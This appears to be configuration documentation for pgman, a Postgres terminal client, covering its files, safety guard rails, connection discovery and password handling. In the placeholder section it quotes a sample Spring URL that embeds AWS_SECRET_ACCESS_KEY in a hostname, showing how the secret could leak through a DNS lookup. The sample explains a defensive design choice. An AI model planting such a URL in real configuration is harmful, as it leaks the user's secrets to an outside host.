# Configuration

pgman reads from a handful of files under `~/.config/pgman/`,
`~/.local/share/pgman/`, `~/.cache/pgman/`, and an optional
`<repo>/.pgman/` project directory. None of them carry resolved
passwords — those come from `PGPASSWORD`, a per-connection
`password_env`, a Spring config file's own `username`/`password`
keys, or (for IntelliJ) `PGPASSWORD` again, since IntelliJ keeps
passwords in the OS keychain rather than `dataSources.xml`.

## File locations

| Path | Purpose |
| --- | --- |
| `~/.config/pgman/safety.toml` | Personal safety guard rails: default profile + per-database overrides (`src/main.rs::load_safety_config`, `src/safety.rs`). |
| `<repo>/.pgman/pgman.toml` | Project-committed connections + safety overrides. Discovered by walking up from cwd (`src/project.rs`). |
| `~/.local/share/pgman/draft.sql` | Auto-saved editor buffer, restored on next launch (`src/app.rs::draft_path`). |
| `~/.local/share/pgman/history.log` | Query history, one entry per line, newest kept up to 50 (`src/app.rs::history_path`, `HISTORY_CAP`). |
| `~/.local/share/pgman/saved.toml` | Named saved queries (`src/saved.rs`). |
| `~/.cache/pgman/pgman.log` | `tracing` output. Level via `RUST_LOG` (default `info`). Single file, not rotated (`src/main.rs::init_logging`). |
| `~/.cache/pgman/update_check.json` | Cached result of the crates.io version check, re-checked at most every 6 hours (`src/update_check.rs`). |
| `~/.cache/pgman/report-<ts>-<pid>.md` (or `.html`) | Default `\report` output path when none is given (`src/app.rs::default_report_path`). |
| `~/.cache/pgman/<table>-fixture-<ts>-<pid>.xml` | Default `\fixture` output path (`src/app.rs::default_fixture_path`). |

Every `~/.config`, `~/.local/share`, and `~/.cache` path above honours
`XDG_CONFIG_HOME`, `XDG_DATA_HOME`, and `XDG_CACHE_HOME` respectively
when set to an absolute path (e.g. `safety.toml` moves to
`$XDG_CONFIG_HOME/pgman/safety.toml`), falling back to the paths shown
above when the variable is unset, empty, or relative.

Every file pgman itself writes — `draft.sql`, `history.log`,
`saved.toml`, `update_check.json`, and `\report`/`\fixture` output —
goes through `util::write_private`, which writes atomically and then
`chmod`s the file `0600` on unix (a no-op restriction on other
platforms); directories pgman creates under these paths (e.g. a
`\report ~/notes/` target that doesn't exist yet) are created `0700`.
`safety.toml` and `pgman.toml` are yours, not pgman's, so it never
writes them and their permissions are whatever you gave them. This
matters because `safety.toml` and `pgman.toml` carry no secrets by
design, but `history.log`, `draft.sql`, and `saved.toml` can contain
literal values from queries you've run (including ones you typed into
a `WHERE` clause) — `0600` keeps them out of reach of other local
users even under a permissive umask.

## `~/.config/pgman/safety.toml`

Optional. Falls back to hard-coded defaults when absent or when it
fails to parse (a parse error is logged and defaults are used
instead of failing startup — `src/main.rs::load_safety_config`).

```toml
# ~/.config/pgman/safety.toml
#
# [default] is the profile for any database with no entry of its own.
# Every field below shows its built-in default (SafetyProfile::default
# in src/safety.rs) — you only need to write the ones you want to change.

[default]
# Open the connection with `default_transaction_read_only = on`. A
# write attempted on a read-only session is rejected by Postgres
# itself, on top of the client-side guards below.
read_only = true

# Session `statement_timeout`, in milliseconds. 0 disables it.
statement_timeout_ms = 30000

# Wrap writes (anything that isn't a plain SELECT) in an explicit
# transaction and leave it open on success — pgman then prompts
# commit (y) / rollback (n / Esc) before you can run anything else.
auto_tx = true

# Row-count threshold above which a SELECT triggers a pre-flight
# EXPLAIN cost preview + confirm prompt. 0 disables the check
# (default) — opt-in per profile.
cost_preview_threshold_rows = 0

# Which strategy `\fixture` apply (Ctrl-D) uses to empty a table
# before inserting: "truncate" (fast, needs TRUNCATE privilege) or
# "delete_from" (slower, works without it, respects triggers).
clean_mode = "truncate"

# Per-statement-category guard: "allow" | "confirm" | "block".
[default.guards]
insert = "confirm"
update = "confirm"
update_without_where = "block"   # UPDATE with no WHERE — touches every row
delete = "confirm"
delete_without_where = "block"   # DELETE with no WHERE — empties the table
truncate = "confirm"
drop = "block"
ddl = "confirm"                  # ALTER / CREATE / GRANT / VACUUM / …
other = "confirm"                # anything unrecognised (e.g. MERGE)

# Per-database override — only list what differs from [default].
# Unlisted fields (including unlisted [databases.NAME.guards] entries)
# fall back to [default].
[databases.production]
read_only = true
statement_timeout_ms = 5000

[databases.production.guards]
truncate = "block"
```

`SELECT` is always `Guard::Allow` and is never routed through the
per-category guard table. Guards key off `classify()`'s heuristic
statement classification — see `docs/safety-and-privacy.md` for how
that works and its known imprecision.

## `<repo>/.pgman/pgman.toml` (project-committed)

Intended to be committed to git so a team shares the same list of
data sources and per-database safety rules. Discovery walks up from
the current directory looking for a `.pgman/` folder, so pgman works
from any subdirectory of the project (`src/project.rs::find_root`). A
malformed file is logged and ignored — pgman falls back to normal
discovery rather than refusing to start.

```toml
# .pgman/pgman.toml — commit this. No passwords here: they come from
# the variable a connection's password_env names. PGPASSWORD is NOT
# used for anything in this file — it's only applied to --dsn.

[[connections]]
name = "local"
url  = "postgres://postgres@localhost:5432/myapp"

[[connections]]
name = "staging"
url  = "postgres://stg-db.internal:5432/myapp"
# Override the user embedded in the URL — useful when the URL is
# shared but each teammate should log in as themselves.
user = "app"
# Env var holding the password. Precedence: password_env, then any
# password embedded in the URL itself, then none at all. An empty env
# var is treated as unset (so `unset FOO` doesn't blank out a URL
# password). There is deliberately no PGPASSWORD fallback here.
password_env = "STAGING_DB_PASSWORD"

[[connections]]
name = "via-bastion"
url  = "postgres://db.internal:5432/myapp"
# Optional bastion target: [user@]host[:port]. pgman shells out to
# the system `ssh` binary (BatchMode=yes) and opens a local forward
# before connecting, honouring your ~/.ssh/config (keys, ProxyCommand,
# etc). Wins over a `?ssh_tunnel=...` URL param on the same connection;
# a malformed value here clears any URL-embedded tunnel too, rather
# than silently falling back to it. Because that runs `ssh` with your
# keys against a host this committed file names, picking this
# connection asks you to confirm the bastion first.
ssh_tunnel = "tom@bastion.example.com"

# Per-database safety overrides. These can only TIGHTEN your personal
# ~/.config/pgman/safety.toml — never relax it (see below). Commit just
# [safety.databases.production] and your own defaults still apply
# everywhere else. [safety.default] is accepted too.
[safety.databases.production]
read_only = true
statement_timeout_ms = 5000
```

**Project safety overrides can only tighten.** This file is committed,
so its contents are chosen by whoever wrote the checkout, not by
whoever is running pgman in it. `project::merge_safety` therefore takes
the *more restrictive* of the two values for every field:

| Field | Merged value |
| --- | --- |
| `read_only`, `auto_tx` | personal `||` project — on is stricter |
| `statement_timeout_ms`, `cost_preview_threshold_rows` | the smaller **non-zero** value (`0` means "no limit", the weakest) |
| every guard | the stricter of `allow` < `confirm` < `block` |
| `clean_mode` | yours — it isn't a guard rail and isn't orderable, so a project override is ignored |

A project file that tries to relax something isn't an error: the looser
value is ignored, and a line naming the field goes to
`~/.cache/pgman/pgman.log` so you can see what the repo asked for.
Naming a database the personal config doesn't mention starts that
database from your personal `default`, so a project can't relax a
database just by being the first to name it.

One consequence worth knowing: a `[safety]` block is read as a
*complete* profile, so fields it omits arrive as pgman's own defaults —
and those are strict. A project block that sets only `read_only` will
also re-tighten any guard you personally relaxed. That's the safe
direction, but it's why the block is all-or-nothing rather than a patch.

`--batch` applies the same merge, so a team's committed tightening
holds in CI.

## Datasource discovery and precedence

On startup (and, more restrictively, in `--batch` mode) pgman
collects candidate connections from every applicable source into one
list, then decides what to do with it (`src/main.rs`):

1. **`--dsn <url>`** — if passed, this is used outright. Discovery
   below still runs (so the picker is available if the connection
   later fails), but it never overrides an explicit `--dsn`.
2. **`.pgman/pgman.toml`** (`[[connections]]`) — loaded first into the
   candidate list, if a `.pgman/` directory is found walking up from
   cwd.
3. **Spring** — if `pom.xml` / `build.gradle` / `build.gradle.kts`
   exists in cwd (`creds::spring::detect_java_project`), pgman scans
   `src/main/resources/application*.{properties,yml,yaml}` and
   `bootstrap*.{yml,yaml}`. Spring's own precedence is followed:
   `.properties` outranks `.yml`/`.yaml` for the same base name, and a
   profile file (`application-prod.yml`) overlays the base
   (`application.yml`) field-by-field — an overlay value only wins
   when it's non-empty, so a profile that sets just a password doesn't
   blank out the base URL/username. Both `spring.datasource.*` and
   non-canonical prefixes (`dataSource.*`, `logDataSource.*`, …) are
   recognised; a prefix is only emitted as a candidate when its `.url`
   starts with `jdbc:`.
4. **IntelliJ** — if `.idea/` exists, pgman parses
   `.idea/dataSources.xml` (committed) merged with
   `.idea/dataSources.local.xml` (gitignored, per-user), joined by
   data-source UUID. Username precedence: URL &gt; committed
   `<user-name>` &gt; local `<user-name>`. When the JDBC URL has no
   path component, one pick is emitted per database found in the
   local file's schema-mapping (`<node kind="database" qname="…">`);
   with no local metadata at all it falls back to Postgres's own
   default database name.

**Passwords**: `PGPASSWORD` is only used with `--dsn`. No discovered
source borrows it — a URL that came out of the working tree names a
host the repo author chose, and sending your password there is the
whole problem. So: project connections use the variable their own
`password_env` names, else the URL's embedded password, else none.
Spring datasource blocks use the file's own `username`/`password` keys
(profile overlay rules apply). IntelliJ picks use the URL's embedded
password if any, else none — IntelliJ never writes passwords to
`dataSources.xml`, so in practice an IntelliJ pick connects without
one; use `--dsn` (or a `.pgman/pgman.toml` entry with a
`password_env`) when a password is needed.

**No auto-pick**: nothing discovered is connected to without you
choosing it. If `--dsn` was not passed, pgman lands in the interactive
picker (`Mode::ConnPick`) whatever it found — one candidate or ten —
and connects only on Enter. Everything in that list was read out of the
working tree, so a checkout you didn't write chooses the host; see
[Running pgman inside a checkout you did not
write](safety-and-privacy.md#running-pgman-inside-a-checkout-you-did-not-write).
`--dsn` is your own and connects immediately.

The picker row shows, for each candidate: its origin, its name,
`user@host:port/db`, its `sslmode` (or `default` when the URL doesn't
set one), and `tunnel → <bastion>` when an `ssh_tunnel` is configured.
A candidate with a tunnel asks a second time before pgman spawns `ssh`.

In `--batch` mode there's no picker to fall back on, so a single
discovered candidate is still used; zero or more-than-one is a hard
error asking for `--dsn` (`src/main.rs::resolve_batch_dsn`). Batch
inherits the same password and placeholder rules — it has no
`PGPASSWORD` fallback for a discovered source either.

**Unresolved `${...}` placeholders**: Spring config files commonly use
`${DB_HOST}` / `${db.password}`-style placeholders meant to be
resolved by Spring's own environment/property-source machinery at
JVM boot. pgman's discovery path resolves `${NAME}` and
`${NAME:default}` against the current process's environment
(`std::env::var` as the lookup) — the same variables the JVM would see
if launched from this shell — **except in the URL's host and port,
which are never resolved**
(`creds::spring::resolve_url_placeholders`). Substituting an
environment value into a hostname chosen by a committed file sends
that value out as a DNS lookup:
`url: jdbc:postgresql://${AWS_SECRET_ACCESS_KEY}.example.com/db` is an
exfiltration primitive that needs no Postgres server at all. So
username, password, database name and query parameters resolve; host
and port do not. A URL with no `://` (`url: ${SPRING_DATASOURCE_URL}`)
or a placeholder in its scheme has no identifiable host component, so
nothing in it resolves either.

A pick with anything unresolved stays in the picker but marked, e.g.
`[Spring] app — unresolved ${DB_HOST}`, including one whose URL
wouldn't parse at all (`db:${DB_PORT}`) — it is never dropped
silently. Choosing it (Enter, or `\c <name>`) is refused:

- a name that's simply unset (or nested/malformed) →
  `unresolved placeholder ${DB_USER} — export it, or put the
  connection in .pgman/pgman.toml`;
- a placeholder in the host or port → a message saying pgman never
  resolves a placeholder into a hostname, whatever the environment
  holds. Exporting it does not help; put a literal host in
  `.pgman/pgman.toml`.

An unresolved **password** placeholder marks the pick the same way:
there is no `PGPASSWORD` fallback for a discovered source, so the
literal `${db.password}` text has nowhere useful to go — and it is
never stored on the DSN, so it can never be sent to a server as a
password.

## Environment variables

| Variable | Effect |
| --- | --- |
| `PGPASSWORD` | Password for a `--dsn` that doesn't carry one. **Not consulted for anything discovered** (project, Spring or IntelliJ) — those name hosts chosen by files in the working tree. |
| `PGMAN_NO_UPDATE_CHECK` | Any value disables the crates.io version check, same as `--no-update-check`. |
| `RUST_LOG` | `tracing` filter for `~/.cache/pgman/pgman.log` (e.g. `RUST_LOG=debug`). Falls back to `info` when unset or invalid. Not read in `--batch` mode (which skips file logging entirely). |
| `EDITOR` / `VISUAL` | External editor for `\e` (suspends the TUI, edits the buffer in a temp file, resumes). Checked in that order — `EDITOR` first, then `VISUAL` — falling back to `vi`. Split on whitespace, no shell involved (so quoting/globs in the value aren't supported). |

## Themes

`--theme dark` (default) | `light` | `high-contrast` (aliases:
`highcontrast`, `hc`) — case-insensitive (`src/theme.rs::Theme::resolve`).
An unrecognised name falls back to `dark` with a logged warning
rather than failing startup.
